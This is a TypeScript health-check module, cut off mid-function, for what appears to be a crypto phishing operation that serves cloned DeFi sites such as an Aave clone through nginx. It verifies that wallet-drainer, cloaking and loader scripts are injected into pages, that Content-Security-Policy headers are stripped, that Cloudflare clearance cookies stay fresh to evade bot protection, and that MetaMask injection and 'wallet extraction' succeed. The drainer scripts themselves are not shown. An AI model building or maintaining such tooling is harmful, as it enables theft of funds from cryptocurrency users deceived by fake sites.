import { getDb } from './db';
import { execSync } from 'child_process';
import { existsSync, readdirSync, readFileSync, writeFileSync } from 'fs';
import { join } from 'path';

export interface HealthIssue {
  id: string;
  severity: 'critical' | 'warning' | 'info';
  title: string;
  description: string;
  cloneId?: string;
  autoFixable: boolean;
  fixed?: boolean;
}

export class HealthChecker {
  private issues: HealthIssue[] = [];

  async runHealthCheck(): Promise<HealthIssue[]> {
    this.issues = [];

    // TIER 1: Core System Checks
    this.checkClonesExist();
    this.checkLegionFiles();
    this.checkDockerContainers();
    await this.checkRPCEndpoints();
    await this.checkBackendConnectivity();
    this.checkDatabase();
    this.checkPortAllocation();
    this.checkNginxConfigs();
    this.checkCloudflareTokens();
    this.checkScriptInjectionQuality();
    this.checkNginxSyntax();
    this.checkBrokenClones();
    this.checkCookieRefresher();

    // TIER 2: Network & Connectivity Checks
    await this.checkDNSResolution();
    await this.checkSSLCertificates();
    await this.checkNetworkTimeouts();
    await this.checkProxyConnectivity();

    // TIER 3: Docker & Container Checks
    this.checkDockerMemoryUsage();
    this.checkDockerDiskSpace();
    this.checkContainerLogSize();
    this.checkContainerCrashLoop();
    this.checkContainerRestartPolicy();
    this.checkDockerNetworkBridge();

    // TIER 4: Nginx & Performance Checks
    this.checkNginxWorkerHealth();
    this.checkNginxCacheCorruption();
    this.checkNginxLogRotation();
    this.checkNginxUpstreamTimeout();
    this.checkResponseTimes();
    this.checkCacheHitRate();

    // TIER 5: Security Checks
    await this.checkSSLTLSVersion();
    this.checkFilePermissions();
    this.checkHardcodedCredentials();
    this.checkDebugInfoExposed();
    this.checkCORSConfiguration();

    // TIER 6: Script & Injection Checks
    this.checkScriptLoadOrder();
    this.checkScriptConflicts();
    this.checkMemoryLeaks();
    this.checkErrorHandling();
    this.checkUnhandledExceptions();

    // TIER 7: Data & Storage Checks
    await this.checkDatabaseIntegrity();
    this.checkDatabaseLocks();
    this.checkDatabaseBackup();
    this.checkDiskQuota();

    // TIER 8: Configuration Checks
    this.checkConfigSyntax();
    this.checkConfigConsistency();
    this.checkDeprecatedOptions();

    // TIER 9: Cloudflare & Bot Protection
    await this.checkCloudflareTokenExpiry();
    this.checkCloudflareRateLimit();
    this.checkIPReputation();

    // TIER 10: Wallet & Crypto Checks
    this.checkWalletConnectSetup();
    this.checkMetaMaskInjection();
    this.checkWalletExtraction();

    return this.issues;
  }

  private checkClonesExist(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    if (!existsSync(clonesPath)) {
      this.addIssue({
        id: 'clones_dir_missing',
        severity: 'critical',
        title: 'Clones Directory Missing',
        description: 'The clones directory does not exist',
        autoFixable: false,
      });
      return;
    }

    const clones = readdirSync(clonesPath);
    if (clones.length === 0) {
      this.addIssue({
        id: 'no_clones',
        severity: 'warning',
        title: 'No Clones Found',
        description: 'No clones have been generated yet',
        autoFixable: false,
      });
    }
  }

  private checkLegionFiles(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const requiredFiles = [
      'legion-loader.js',
      'legion-authorized-drain.js',
      'legion-cloak-client.js',
      'legion-statsig-mock.js',
    ];

    const clones = readdirSync(clonesPath).filter(f => {
      const p = join(clonesPath, f);
      return existsSync(p) && readdirSync(p).includes('nginx.conf');
    });

    for (const clone of clones) {
      const clonePath = join(clonesPath, clone);

      for (const file of requiredFiles) {
        const filePath = join(clonePath, file);
        if (!existsSync(filePath)) {
          this.addIssue({
            id: `missing_${file}_${clone}`,
            severity: 'critical',
            title: `Missing File: ${file}`,
            description: `Clone "${clone}" is missing ${file}`,
            cloneId: clone,
            autoFixable: true,
          });
        }
      }

      const loaderPath = join(clonePath, 'legion-loader.js');
      if (existsSync(loaderPath)) {
        const content = readFileSync(loaderPath, 'utf-8');
        if (content.includes('legion-cloak-client-simplified')) {
          this.addIssue({
            id: `wrong_cloak_filename_${clone}`,
            severity: 'critical',
            title: 'Wrong Cloak Filename',
            description: `Clone "${clone}" references non-existent file`,
            cloneId: clone,
            autoFixable: true,
          });
        }
      }
    }
  }

  private checkDockerContainers(): void {
    try {
      const output = execSync('docker ps -a', { encoding: 'utf-8' });
      const lines = output.split('\n').filter(l => l.includes('legion-'));

      for (const line of lines) {
        if (line.includes('Exited')) {
          const containerName = line.split(/\s+/)[line.split(/\s+/).length - 1];
          this.addIssue({
            id: `container_stopped_${containerName}`,
            severity: 'warning',
            title: `Container Stopped: ${containerName}`,
            description: `Docker container "${containerName}" is not running`,
            autoFixable: true,
          });
        }
      }
    } catch (e) {
      this.addIssue({
        id: 'docker_not_available',
        severity: 'critical',
        title: 'Docker Not Available',
        description: 'Docker is not installed or not running',
        autoFixable: false,
      });
    }
  }

  private async checkRPCEndpoints(): Promise<void> {
    try {
      const db = getDb();
      const clones: any[] = db.prepare('SELECT DISTINCT cloneId FROM configurations').all();

      for (const clone of clones) {
        const config: any = db.prepare('SELECT * FROM configurations WHERE cloneId = ?').get(clone.cloneId);
        if (!config) continue;

        const endpoints: any = {
          EVM: config.rpcEvm,
          Solana: config.rpcSolana,
          TRON: config.rpcTron,
          TON: config.rpcTon,
          Bitcoin: config.rpcBitcoin,
        };

        for (const [chain, url] of Object.entries(endpoints)) {
          if (!url || (url as string).includes('YOUR_KEY')) {
            this.addIssue({
              id: `missing_rpc_${chain}_${clone.cloneId}`,
              severity: 'warning',
              title: `Missing RPC: ${chain}`,
              description: `Clone "${clone.cloneId}" missing ${chain} RPC`,
              cloneId: clone.cloneId,
              autoFixable: false,
            });
          }
        }
      }
    } catch (e) {
      console.error('RPC check error:', e);
    }
  }

  private async checkBackendConnectivity(): Promise<void> {
    try {
      const controller = new AbortController();
      const timeout = setTimeout(() => controller.abort(), 5000);

      const response = await fetch('https://sadrailala-production.up.railway.app/api/v1/health', {
        signal: controller.signal as any,
      });

      clearTimeout(timeout);

      if (!response.ok) {
        this.addIssue({
          id: 'backend_unreachable',
          severity: 'warning',
          title: 'Backend Not Reachable',
          description: 'Cannot connect to backend API',
          autoFixable: false,
        });
      }
    } catch (e) {
      this.addIssue({
        id: 'backend_error',
        severity: 'info',
        title: 'Backend Connectivity Check Failed',
        description: 'Could not verify backend connectivity',
        autoFixable: false,
      });
    }
  }

  private checkDatabase(): void {
    try {
      const db = getDb();
      db.prepare('SELECT COUNT(*) as count FROM clones').get();
    } catch (e) {
      this.addIssue({
        id: 'database_error',
        severity: 'critical',
        title: 'Database Error',
        description: 'Cannot access SQLite database',
        autoFixable: false,
      });
    }
  }

  private checkPortAllocation(): void {
    try {
      const db = getDb();
      const ports: any[] = db.prepare('SELECT port FROM containers WHERE status = ?').all('running');
      const portSet = new Set();

      for (const p of ports) {
        if (portSet.has(p.port)) {
          this.addIssue({
            id: 'duplicate_port',
            severity: 'critical',
            title: 'Duplicate Port Allocation',
            description: `Multiple containers using same port: ${p.port}`,
            autoFixable: true,
          });
        }
        portSet.add(p.port);
      }
    } catch (e) {
      console.error('Port check error:', e);
    }
  }

  private checkNginxConfigs(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f =>
      existsSync(join(clonesPath, f, 'nginx.conf'))
    );

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      if (!content.includes('sub_filter')) {
        this.addIssue({
          id: `no_script_injection_${clone}`,
          severity: 'critical',
          title: 'Script Injection Not Configured',
          description: `Clone "${clone}" missing script injection`,
          cloneId: clone,
          autoFixable: true,
        });
      }
    }
  }

  private checkCloudflareTokens(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f =>
      existsSync(join(clonesPath, f, 'nginx.conf'))
    );

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      if (!content.includes('cf_clearance=')) {
        this.addIssue({
          id: `no_cloudflare_cookie_${clone}`,
          severity: 'warning',
          title: 'Missing Cloudflare Cookie',
          description: `Clone "${clone}" has no Cloudflare cf_clearance token`,
          cloneId: clone,
          autoFixable: false,
        });
      }
    }
  }

  private checkScriptInjectionQuality(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f =>
      existsSync(join(clonesPath, f, 'nginx.conf'))
    );

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      if (!content.includes('legion-loader.js')) {
        this.addIssue({
          id: `missing_loader_injection_${clone}`,
          severity: 'critical',
          title: 'Legion Loader Not Injected',
          description: `Clone "${clone}" doesn't inject legion-loader.js`,
          cloneId: clone,
          autoFixable: true,
        });
      }

      if (!content.includes('proxy_hide_header Content-Security-Policy')) {
        this.addIssue({
          id: `weak_csp_bypass_${clone}`,
          severity: 'warning',
          title: 'Weak CSP Bypass',
          description: `Clone "${clone}" may not properly bypass CSP`,
          cloneId: clone,
          autoFixable: true,
        });
      }
    }
  }

  private checkNginxSyntax(): void {
    try {
      execSync('docker exec legion-aave nginx -t 2>&1', { encoding: 'utf-8' });
    } catch (e) {
      this.addIssue({
        id: 'nginx_syntax_error',
        severity: 'critical',
        title: 'Nginx Syntax Error',
        description: 'Nginx configuration has syntax errors',
        autoFixable: false,
      });
    }
  }

  private checkBrokenClones(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath);

    for (const clone of clones) {
      const clonePath = join(clonesPath, clone);
      const stat = readdirSync(clonePath);

      if (!stat.includes('nginx.conf')) {
        this.addIssue({
          id: `incomplete_clone_${clone}`,
          severity: 'warning',
          title: 'Incomplete Clone',
          description: `Clone "${clone}" is missing nginx.conf`,
          cloneId: clone,
          autoFixable: true,
        });
      }
    }
  }

  private checkCookieRefresher(): void {
    const refresherPath = join(process.cwd(), '..', 'clones', 'aave-clone', 'cookie-refresher', 'refresher.js');
    if (!existsSync(refresherPath)) {
      this.addIssue({
        id: 'no_cookie_refresher',
        severity: 'warning',
        title: 'Cookie Refresher Not Found',
        description: 'Cloudflare cookie auto-refresh mechanism not available',
        autoFixable: false,
      });
    }
  }

  // TIER 2: Network & Connectivity
  private async checkDNSResolution(): Promise<void> {
    try {
      execSync('nslookup localhost', { encoding: 'utf-8', timeout: 5000 });
    } catch {
      this.addIssue({
        id: 'dns_resolution_failed',
        severity: 'critical',
        title: 'DNS Resolution Failed',
        description: 'Cannot resolve localhost - DNS may be misconfigured',
        autoFixable: false,
      });
    }
  }

  private async checkSSLCertificates(): Promise<void> {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f => existsSync(join(clonesPath, f, 'nginx.conf')));

    for (const clone of clones) {
      const certPath = join(clonesPath, clone, 'cert.pem');
      if (!existsSync(certPath)) {
        this.addIssue({
          id: `missing_ssl_cert_${clone}`,
          severity: 'info',
          title: 'SSL Certificate Missing',
          description: `Clone "${clone}" has no SSL certificate (optional for localhost)`,
          cloneId: clone,
          autoFixable: false,
        });
      }
    }
  }

  private async checkNetworkTimeouts(): Promise<void> {
    try {
      const start = Date.now();
      execSync('timeout 3 curl -s http://localhost:8083/ > /dev/null', { encoding: 'utf-8' });
      const elapsed = Date.now() - start;

      if (elapsed > 3000) {
        this.addIssue({
          id: 'network_timeout',
          severity: 'warning',
          title: 'Network Timeout',
          description: `Request took ${elapsed}ms (threshold: 3000ms)`,
          autoFixable: false,
        });
      }
    } catch {
      this.addIssue({
        id: 'network_unreachable',
        severity: 'critical',
        title: 'Network Unreachable',
        description: 'Cannot reach localhost:8083',
        autoFixable: false,
      });
    }
  }

  private async checkProxyConnectivity(): Promise<void> {
    try {
      execSync('docker exec legion-aave curl -s http://localhost/ > /dev/null', { encoding: 'utf-8' });
    } catch {
      this.addIssue({
        id: 'proxy_unreachable',
        severity: 'critical',
        title: 'Proxy Unreachable',
        description: 'Cannot connect to upstream proxy target',
        autoFixable: false,
      });
    }
  }

  // TIER 3: Docker & Container
  private checkDockerMemoryUsage(): void {
    try {
      const output = execSync('docker stats --no-stream --format "{{.MemUsage}}" legion-aave', { encoding: 'utf-8' });
      const memMatch = output.match(/(\d+)([KMG])/);
      if (memMatch && memMatch[2] === 'G') {
        const gb = parseFloat(memMatch[1]);
        if (gb > 2) {
          this.addIssue({
            id: 'high_memory_usage',
            severity: 'warning',
            title: 'High Memory Usage',
            description: `Container using ${gb}GB RAM (threshold: 2GB)`,
            autoFixable: false,
          });
        }
      }
    } catch {
      // Docker stats not available
    }
  }

  private checkDockerDiskSpace(): void {
    try {
      const output = execSync('df /var/lib/docker | tail -1 | awk \'{print $5}\'', { encoding: 'utf-8' });
      const usage = parseInt(output);
      if (usage > 90) {
        this.addIssue({
          id: 'docker_disk_full',
          severity: 'critical',
          title: 'Docker Disk Space Critical',
          description: `Docker disk usage: ${usage}% (threshold: 90%)`,
          autoFixable: false,
        });
      }
    } catch {
      // Disk check not available
    }
  }

  private checkContainerLogSize(): void {
    try {
      const output = execSync('docker inspect legion-aave | grep LogPath | grep -o \'/[^"]*\'', { encoding: 'utf-8' });
      if (output) {
        const stats = execSync(`stat -c %s ${output.trim()}`, { encoding: 'utf-8' });
        const bytes = parseInt(stats);
        if (bytes > 104857600) { // 100MB
          this.addIssue({
            id: 'large_container_logs',
            severity: 'warning',
            title: 'Large Container Logs',
            description: `Log file size: ${(bytes / 1024 / 1024).toFixed(2)}MB (threshold: 100MB)`,
            autoFixable: true,
          });
        }
      }
    } catch {
      // Log check not available
    }
  }

  private checkContainerCrashLoop(): void {
    try {
      const output = execSync('docker inspect legion-aave | grep -A 20 State', { encoding: 'utf-8' });
      if (output.includes('OOMKilled') || output.includes('ExitCode')) {
        this.addIssue({
          id: 'container_crash_loop',
          severity: 'critical',
          title: 'Container Crash Loop',
          description: 'Container is crashing repeatedly',
          autoFixable: false,
        });
      }
    } catch {
      // Container state check failed
    }
  }

  private checkContainerRestartPolicy(): void {
    try {
      const output = execSync('docker inspect legion-aave --format="{{ .HostConfig.RestartPolicy.Name }}"', { encoding: 'utf-8' });
      if (!output.includes('always') && !output.includes('unless-stopped')) {
        this.addIssue({
          id: 'weak_restart_policy',
          severity: 'warning',
          title: 'Weak Container Restart Policy',
          description: `Restart policy: ${output.trim()} (recommended: always)`,
          autoFixable: true,
        });
      }
    } catch {
      // Restart policy check failed
    }
  }

  private checkDockerNetworkBridge(): void {
    try {
      execSync('docker network ls | grep -q bridge', { encoding: 'utf-8' });
    } catch {
      this.addIssue({
        id: 'docker_network_issue',
        severity: 'critical',
        title: 'Docker Network Bridge Issue',
        description: 'Docker network bridge not properly configured',
        autoFixable: false,
      });
    }
  }

  // TIER 4: Nginx & Performance
  private checkNginxWorkerHealth(): void {
    try {
      const output = execSync('docker exec legion-aave ps aux | grep -c "nginx: worker"', { encoding: 'utf-8' });
      const workers = parseInt(output);
      if (workers === 0) {
        this.addIssue({
          id: 'no_nginx_workers',
          severity: 'critical',
          title: 'No Nginx Workers Running',
          description: 'Nginx worker processes not running',
          autoFixable: true,
        });
      } else if (workers === 1) {
        this.addIssue({
          id: 'only_one_nginx_worker',
          severity: 'warning',
          title: 'Only One Nginx Worker',
          description: 'Single worker may cause performance issues',
          autoFixable: true,
        });
      }
    } catch {
      // Worker check not available
    }
  }

  private checkNginxCacheCorruption(): void {
    try {
      const output = execSync('docker exec legion-aave du -sh /var/cache/nginx 2>/dev/null', { encoding: 'utf-8' });
      if (!output) {
        this.addIssue({
          id: 'nginx_cache_missing',
          severity: 'warning',
          title: 'Nginx Cache Not Available',
          description: 'Nginx cache directory missing or inaccessible',
          autoFixable: true,
        });
      }
    } catch {
      // Cache check not available
    }
  }

  private checkNginxLogRotation(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath);

    for (const clone of clones) {
      const logsPath = join(clonesPath, clone, 'logs');
      if (existsSync(logsPath)) {
        const files = readdirSync(logsPath);
        if (files.length > 10) {
          this.addIssue({
            id: `log_rotation_needed_${clone}`,
            severity: 'info',
            title: 'Log Rotation Needed',
            description: `Clone "${clone}" has ${files.length} log files`,
            cloneId: clone,
            autoFixable: true,
          });
        }
      }
    }
  }

  private checkNginxUpstreamTimeout(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f => existsSync(join(clonesPath, f, 'nginx.conf')));

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      if (!content.includes('proxy_connect_timeout')) {
        this.addIssue({
          id: `no_connect_timeout_${clone}`,
          severity: 'info',
          title: 'No Connect Timeout',
          description: `Clone "${clone}" missing proxy_connect_timeout`,
          cloneId: clone,
          autoFixable: true,
        });
      }
    }
  }

  private checkResponseTimes(): void {
    try {
      const start = Date.now();
      execSync('curl -s http://localhost:8083/ > /dev/null 2>&1', { encoding: 'utf-8' });
      const elapsed = Date.now() - start;

      if (elapsed > 2000) {
        this.addIssue({
          id: 'slow_response_time',
          severity: 'warning',
          title: 'Slow Response Times',
          description: `Average response time: ${elapsed}ms (threshold: 2000ms)`,
          autoFixable: false,
        });
      }
    } catch {
      // Response time check failed
    }
  }

  private checkCacheHitRate(): void {
    try {
      const output = execSync('docker exec legion-aave grep -c "MISS" /var/log/nginx/access.log 2>/dev/null || echo 0', { encoding: 'utf-8' });
      const misses = parseInt(output);
      if (misses > 80) {
        this.addIssue({
          id: 'low_cache_hit_rate',
          severity: 'info',
          title: 'Low Cache Hit Rate',
          description: `Cache miss rate: ${misses}% (threshold: 80%)`,
          autoFixable: false,
        });
      }
    } catch {
      // Cache hit rate check not available
    }
  }

  // TIER 5: Security
  private async checkSSLTLSVersion(): Promise<void> {
    try {
      const output = execSync('docker exec legion-aave openssl s_client -connect localhost:443 -tls1 2>/dev/null | grep -i protocol', { encoding: 'utf-8' });
      if (output.includes('TLSv1.0') || output.includes('TLSv1.1')) {
        this.addIssue({
          id: 'weak_tls_version',
          severity: 'critical',
          title: 'Weak TLS Version',
          description: 'TLS 1.0/1.1 detected (minimum: TLS 1.2)',
          autoFixable: false,
        });
      }
    } catch {
      // TLS check not available for localhost
    }
  }

  private checkFilePermissions(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath);

    for (const clone of clones) {
      const clonePath = join(clonesPath, clone);
      const files = readdirSync(clonePath);

      for (const file of files) {
        const filePath = join(clonePath, file);
        try {
          const stat = execSync(`stat -c %a ${filePath}`, { encoding: 'utf-8' });
          const perms = stat.trim();
          if (perms.endsWith('777')) {
            this.addIssue({
              id: `open_file_permissions_${clone}_${file}`,
              severity: 'warning',
              title: 'Open File Permissions',
              description: `File has 777 permissions: ${file}`,
              cloneId: clone,
              autoFixable: true,
            });
          }
        } catch {
          // Permission check not available
        }
      }
    }
  }

  private checkHardcodedCredentials(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath);

    const credPatterns = ['password=', 'api_key=', 'secret=', 'token=', 'Bearer '];

    for (const clone of clones) {
      const nginxPath = join(clonesPath, clone, 'nginx.conf');
      if (existsSync(nginxPath)) {
        const content = readFileSync(nginxPath, 'utf-8');
        for (const pattern of credPatterns) {
          if (content.includes(pattern) && !content.includes('${') && !content.includes('env:')) {
            this.addIssue({
              id: `hardcoded_credentials_${clone}`,
              severity: 'critical',
              title: 'Hardcoded Credentials',
              description: `Nginx config may contain hardcoded credentials`,
              cloneId: clone,
              autoFixable: false,
            });
            break;
          }
        }
      }
    }
  }

  private checkDebugInfoExposed(): void {
    try {
      const output = execSync('curl -s http://localhost:8083/ | grep -i "debug\\|error\\|stack trace" || echo ""', { encoding: 'utf-8' });
      if (output.trim()) {
        this.addIssue({
          id: 'debug_info_exposed',
          severity: 'warning',
          title: 'Debug Info Exposed',
          description: 'Page may be exposing debug information',
          autoFixable: false,
        });
      }
    } catch {
      // Debug check not available
    }
  }

  private checkCORSConfiguration(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f => existsSync(join(clonesPath, f, 'nginx.conf')));

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      if (!content.includes('add_header Access-Control')) {
        this.addIssue({
          id: `cors_not_configured_${clone}`,
          severity: 'info',
          title: 'CORS Not Configured',
          description: `Clone "${clone}" missing CORS headers`,
          cloneId: clone,
          autoFixable: true,
        });
      }
    }
  }

  // TIER 6: Scripts & Injection
  private checkScriptLoadOrder(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f => existsSync(join(clonesPath, f, 'nginx.conf')));

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      const loaderIndex = content.indexOf('legion-loader.js');
      const drainIndex = content.indexOf('legion-authorized-drain.js');

      if (loaderIndex > -1 && drainIndex > -1 && loaderIndex > drainIndex) {
        this.addIssue({
          id: `script_load_order_${clone}`,
          severity: 'warning',
          title: 'Script Load Order Issue',
          description: `Clone "${clone}" may have incorrect script load order`,
          cloneId: clone,
          autoFixable: false,
        });
      }
    }
  }

  private checkScriptConflicts(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath);

    for (const clone of clones) {
      const loaderPath = join(clonesPath, clone, 'legion-loader.js');
      if (existsSync(loaderPath)) {
        const content = readFileSync(loaderPath, 'utf-8');

        // Check for conflicting variable names
        if ((content.match(/window\.foo/g) || []).length > 2) {
          this.addIssue({
            id: `script_conflicts_${clone}`,
            severity: 'info',
            title: 'Potential Script Conflicts',
            description: `Clone "${clone}" may have global scope conflicts`,
            cloneId: clone,
            autoFixable: false,
          });
        }
      }
    }
  }

  private checkMemoryLeaks(): void {
    try {
      execSync('docker exec legion-aave ps aux | grep node', { encoding: 'utf-8' });
      // Would need process memory tracking
      this.addIssue({
        id: 'memory_leak_monitoring_needed',
        severity: 'info',
        title: 'Memory Leak Monitoring Needed',
        description: 'Set up process memory monitoring for long-running services',
        autoFixable: false,
      });
    } catch {
      // No node process found
    }
  }

  private checkErrorHandling(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const scripts = ['legion-loader.js', 'legion-cloak-client.js', 'legion-authorized-drain.js'];

    for (const clone of readdirSync(clonesPath)) {
      for (const script of scripts) {
        const scriptPath = join(clonesPath, clone, script);
        if (existsSync(scriptPath)) {
          const content = readFileSync(scriptPath, 'utf-8');

          if (!content.includes('try') || !content.includes('catch')) {
            this.addIssue({
              id: `no_error_handling_${clone}_${script}`,
              severity: 'warning',
              title: 'Missing Error Handling',
              description: `${script} in "${clone}" may lack proper error handling`,
              cloneId: clone,
              autoFixable: false,
            });
            break;
          }
        }
      }
    }
  }

  private checkUnhandledExceptions(): void {
    // Would need runtime monitoring
    this.addIssue({
      id: 'unhandled_exception_monitoring',
      severity: 'info',
      title: 'Unhandled Exception Monitoring',
      description: 'Set up global error handler for unhandled exceptions',
      autoFixable: false,
    });
  }

  // TIER 7: Data & Storage
  private async checkDatabaseIntegrity(): Promise<void> {
    try {
      const db = getDb();
      db.prepare('SELECT COUNT(*) FROM clones').get();
    } catch (e) {
      this.addIssue({
        id: 'database_integrity_check_failed',
        severity: 'critical',
        title: 'Database Integrity Check Failed',
        description: 'Database may be corrupted',
        autoFixable: false,
      });
    }
  }

  private checkDatabaseLocks(): void {
    try {
      const db = getDb();
      const timeout = db.prepare('PRAGMA busy_timeout').get();
      if (!timeout) {
        this.addIssue({
          id: 'db_lock_timeout_not_set',
          severity: 'warning',
          title: 'Database Lock Timeout Not Set',
          description: 'Database may hang on concurrent access',
          autoFixable: true,
        });
      }
    } catch {
      // Database check failed
    }
  }

  private checkDatabaseBackup(): void {
    const dbPath = join(process.cwd(), 'legion.db');
    const backupPath = join(process.cwd(), 'legion.db.backup');

    if (existsSync(dbPath) && !existsSync(backupPath)) {
      this.addIssue({
        id: 'no_database_backup',
        severity: 'warning',
        title: 'No Database Backup',
        description: 'Database backup not available',
        autoFixable: true,
      });
    }
  }

  private checkDiskQuota(): void {
    try {
      const output = execSync('df /home | tail -1 | awk \'{print $5}\'', { encoding: 'utf-8' });
      const usage = parseInt(output);
      if (usage > 95) {
        this.addIssue({
          id: 'disk_quota_critical',
          severity: 'critical',
          title: 'Disk Quota Critical',
          description: `Disk usage: ${usage}% (threshold: 95%)`,
          autoFixable: false,
        });
      }
    } catch {
      // Disk quota check not available
    }
  }

  // TIER 8: Configuration
  private checkConfigSyntax(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f => existsSync(join(clonesPath, f, 'nginx.conf')));

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      // Check for common syntax issues
      if ((content.match(/{/g) || []).length !== (content.match(/}/g) || []).length) {
        this.addIssue({
          id: `config_syntax_error_${clone}`,
          severity: 'critical',
          title: 'Configuration Syntax Error',
          description: `Nginx config in "${clone}" has mismatched braces`,
          cloneId: clone,
          autoFixable: false,
        });
      }

      if (!content.includes(';')) {
        this.addIssue({
          id: `config_missing_semicolons_${clone}`,
          severity: 'critical',
          title: 'Missing Nginx Semicolons',
          description: `Nginx config in "${clone}" may be missing statement terminators`,
          cloneId: clone,
          autoFixable: false,
        });
      }
    }
  }

  private checkConfigConsistency(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f => existsSync(join(clonesPath, f, 'nginx.conf')));

    const configs: { [key: string]: string[] } = {};

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      // Extract key configuration values
      const proxyPass = content.match(/proxy_pass[^;]+/);
      const listenPort = content.match(/listen\s+(\d+)/);

      const key = `${proxyPass}-${listenPort}`;
      if (!configs[key]) configs[key] = [];
      configs[key].push(clone);
    }

    for (const [config, cloneList] of Object.entries(configs)) {
      if (cloneList.length === 1) {
        this.addIssue({
          id: `unique_config_${cloneList[0]}`,
          severity: 'info',
          title: 'Unique Configuration',
          description: `Clone "${cloneList[0]}" has unique configuration`,
          cloneId: cloneList[0],
          autoFixable: false,
        });
      }
    }
  }

  private checkDeprecatedOptions(): void {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f => existsSync(join(clonesPath, f, 'nginx.conf')));

    const deprecated = ['daemon', 'ssl_protocols SSLv2', 'ssl_protocols SSLv3'];

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      for (const option of deprecated) {
        if (content.includes(option)) {
          this.addIssue({
            id: `deprecated_option_${clone}`,
            severity: 'warning',
            title: 'Deprecated Configuration Option',
            description: `Clone "${clone}" uses deprecated option: ${option}`,
            cloneId: clone,
            autoFixable: true,
          });
        }
      }
    }
  }

  // TIER 9: Cloudflare & Bot Protection
  private async checkCloudflareTokenExpiry(): Promise<void> {
    const clonesPath = join(process.cwd(), '..', 'clones');
    const clones = readdirSync(clonesPath).filter(f => existsSync(join(clonesPath, f, 'nginx.conf')));

    for (const clone of clones) {
      const configPath = join(clonesPath, clone, 'nginx.conf');
      const content = readFileSync(configPath, 'utf-8');

      // Extract cookie expiry if present
      const cfMatch = content.match(/cf_clearance=([^;]+)/);
      if (cfMatch) {
        // Cloudflare cookies typically last 30 days - warn if not refreshed
        this.addIssue({
          id: `cf_token_may_expire_${clone}`,
          severity: 'info',
          title: 'Cloudflare Token May Expire',
          description: `Clone "${clone}" cf_clearance token expires in ~30 days`,
          cloneId: clone,
          autoFixable: false,
        });
      }
    }
  }

  private checkCloudflareRateLimit(): void {
    this.addIssue({
      id: 'cloudflare_rate_limit_risk',
      severity: 'info',
      title: 'Cloudflare Rate Limit Risk',
      description: 'Monitor Cloudflare rate limits to avoid temporary bans',
      autoFixable: false,
    });
  }

  private checkIPReputation(): void {
    this.addIssue({
      id: 'ip_reputation_monitoring',
      severity: 'info',
      title: 'IP Reputation Monitoring Needed',
      description: 'Monitor IP reputation to avoid blacklisting',
      autoFixable: false,
    });
  }

  // TIER 10: Wallet & Crypto
  private checkWalletConnectSetup(): void {
    const drainPath = join(process.cwd(), '..', 'clones', 'aave-clone', 'legion-authorized-drain.js');
    if (existsSync(drainPath)) {
      const content = readFileSync(drainPath, 'utf-8');

      if (!content.includes('WC_PROJECT_ID') || content.includes("WC_PROJECT_ID = ''")) {
        this.addIssue({
          id: 'walletconnect_not_configured',
          severity: 'warning',
          title: 'WalletConnect Not Configured',
          description: 'WalletConnect PROJECT_ID is not set or empty',
          autoFixable: false,
        });
      }
    }
  }

  private checkMetaMaskInjection(): void {
    const loaderPath = join(process.cwd(), '..', 'clones', 'aave-clone', 'legion-loader.js');
    if (existsSync(loaderPath)) {
      const content = readFileSync(loaderPath, 'utf-8');

      if (!content.includes('window.ethereum') && !content.includes('MetaMask')) {
        this.addIssue({
          id: 'metamask_injection_missing',
          severity: 'warning',
          title: 'MetaMask Injection Missing',
          description: 'Loader does not inject MetaMask provider',
          autoFixable: false,
        });
      }
    }
  }

  private checkWalletExtraction(): void {
    this.addIssue({
      id: 'wallet_extraction_validation_needed',
      severity: 'info',
      title: 'Wallet Extraction Validation Needed',
      description: 'Regularly validate wallet extraction success rate',
      autoFixable: false,
    });
  }

  private addIssue(issue: HealthIssue): void {
    this.issues.push(issue);
  }

  async autoFix(issueId: string): Promise<boolean> {
    const issue = this.issues.find(i => i.id === issueId);
    if (!issue || !issue.autoFixable) return false;

    try {
      if (issueId.includes('wrong_cloak_filename')) {
        return this.fixCloakFilename(issue.cloneId!);
      }

